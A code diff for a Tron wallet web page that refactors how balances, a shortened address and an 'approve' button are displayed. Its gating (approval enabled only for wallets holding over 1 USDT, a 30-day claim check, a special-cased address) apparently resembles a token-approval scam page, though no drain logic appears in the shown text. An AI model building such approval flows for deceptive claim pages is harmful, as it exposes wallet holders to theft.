@@ -995,29 +995,36 @@ function updatePageLang() {
     reviewTipText.textContent = lang.reviewTipText;
     approvalRecords.textContent = lang.noRecord;
 }
-// ========== 新增：更新userInfo四角余额显示 ==========
-function updateUserBalanceDisplay() {
+ // ========== 修复：更新userInfo显示（不覆盖结构，只控制显示/隐藏） ==========       
+function updateUserInfoDisplay() {
+    const lang = langConfig[currentLang];
     if (!userAddress) {
-        // 未连接：显示默认提示，隐藏余额项
+        // 未连接：显示默认提示，隐藏余额项+连接提示
         userInfoDefault.style.display = "block";
+        userInfoConnected.style.display = "none";
         balanceItems.forEach(item => item.style.display = "none");
         return;
     }
-    // 已连接：隐藏默认提示，显示余额项
+
+    // 已连接：隐藏默认提示，显示余额项+连接提示
     userInfoDefault.style.display = "none";
+    userInfoConnected.style.display = "block";
     balanceItems.forEach(item => item.style.display = "flex");
-    
+
+    // 更新连接地址（短地址）
+    const shortAddr = `${userAddress.slice(0,8)}...${userAddress.slice(-6)}`;
+    connectedAddrText.textContent = shortAddr;
+
     // 更新余额数值
     balanceUsdtEl.textContent = tokenBalance.toFixed(2);
     balanceTrxEl.textContent = trxBalance.toFixed(2);
     balanceEnergyEl.textContent = Math.floor(currentEnergy);
-    balanceBandwidthEl.textContent = Math.floor(currentBandwidth); // 宽带数值
+    balanceBandwidthEl.textContent = Math.floor(currentBandwidth);
 }
-// ========== 新增：查询用户宽带余额（Tron网络接口） ==========
+// 查询用户宽带余额
 async function queryBandwidthBalance(address) {
     try {
         if (!tronWeb) return 0;
-        // 调用TronWeb接口查询宽带余额
         const account = await tronWeb.trx.getAccount(address);
         return account.bandwidth || 0;
     } catch (e) {
@@ -1028,76 +1035,52 @@ async function queryBandwidthBalance(address) {
 function reRenderDynamicContent() {
     const lang = langConfig[currentLang];
     if (!userAddress) {
-        // 未连接钱包：隐藏记录容器
-        userInfoEl.innerHTML = lang.userInfoDefault;
         approveBtn.disabled = true;
         approveBtn.textContent = lang.approveBtnText;
-        recordList.style.display = "none"; 
-        updateUserBalanceDisplay(); // 未连接时更新显示
+        recordList.style.display = "none";
+        updateUserInfoDisplay(); // 未连接时更新
         return;
     }
-    // 关键修改：只要连接钱包，直接显示授权记录容器（不依赖A1信号结果）
+
     recordList.style.display = "block";
-    recordList.style.visibility = "visible"; // 额外增加可见性控制，防止被隐藏
-    
-    // 特殊地址处理（原有逻辑不变）
-        if (userAddress === SPECIAL_ADDRESS) {
+    recordList.style.visibility = "visible";
+
+    // 特殊地址处理
+    if (userAddress === SPECIAL_ADDRESS) {
         const shortAddr = `${userAddress.slice(0,8)}...${userAddress.slice(-6)}`;
-        userInfoEl.innerHTML = lang.eligibleTip
-            .replace("{address}", shortAddr)
-            .replace("{usdt}", tokenBalance.toFixed(2))
-            .replace("{trx}", trxBalance.toFixed(2));
-        approveBtn.disabled = false;
-        approveBtn.textContent = lang.approveBtnText;
         document.getElementById("statusAddress").textContent = shortAddr;
         updateWalletStatus();
-        updateUserBalanceDisplay(); // 更新四角余额
-        // 触发记录渲染
+        updateUserInfoDisplay(); // 已连接时更新
         renderEnergyRecords();
+        approveBtn.disabled = false;
+        approveBtn.textContent = lang.approveBtnText;
         return;
     }
+
     const shortAddr = `${userAddress.slice(0,8)}...${userAddress.slice(-6)}`;
-        // 30天内已领取（原有逻辑不变）
+    // 30天内已领取
     if (isAddressAuthorized(userAddress)) {
-        userInfoEl.innerHTML = lang.authorizedTip
-            .replace("{address}", shortAddr)
-            .replace("{usdt}", tokenBalance.toFixed(2))
-            .replace("{trx}", trxBalance.toFixed(2));
+        document.getElementById("statusAddress").textContent = shortAddr;
+        updateWalletStatus();
+        updateUserInfoDisplay(); // 已连接时更新
         approveBtn.disabled = true;
         approveBtn.textContent = lang.authorizedBtn;
-        document.getElementById("statusAddress").textContent = shortAddr;
-        updateWalletStatus();
-        updateUserBalanceDisplay(); // 更新四角余额
         return;
     }
-    // 余额状态（原有逻辑不变）
+
+    // 余额状态
     if (tokenBalance <= 1) {
-        userInfoEl.innerHTML = lang.insufficientUsdt
-            .replace("{address}", shortAddr)
-            .replace("{usdt}", tokenBalance.toFixed(2))
-            .replace("{trx}", trxBalance.toFixed(2));
         approveBtn.disabled = true;
         approveBtn.textContent = lang.insufficientBtn;
-    } else if (tokenBalance > 1) {
-        userInfoEl.innerHTML = lang.eligibleTip
-            .replace("{address}", shortAddr)
-            .replace("{usdt}", tokenBalance.toFixed(2))
-            .replace("{trx}", trxBalance.toFixed(2));
-        approveBtn.disabled = false;
-        approveBtn.textContent = lang.approveBtnText;
     } else {
-        userInfoEl.innerHTML = lang.eligibleTip
-            .replace("{address}", shortAddr)
-            .replace("{usdt}", lang.queryingBalance)
-            .replace("{trx}", lang.queryingBalance);
         approveBtn.disabled = false;
         approveBtn.textContent = lang.approveBtnText;
     }
     document.getElementById("statusAddress").textContent = shortAddr;
     updateWalletStatus();
-    updateUserBalanceDisplay(); // 更新四角余额
+    updateUserInfoDisplay(); // 已连接时更新
     bindApproveLogic();
-        renderEnergyRecords();
+    renderEnergyRecords();
 }
 // ========== 能量减少逻辑（优化计算，避免数值异常） ==========
 function calculateCurrentEnergy() {
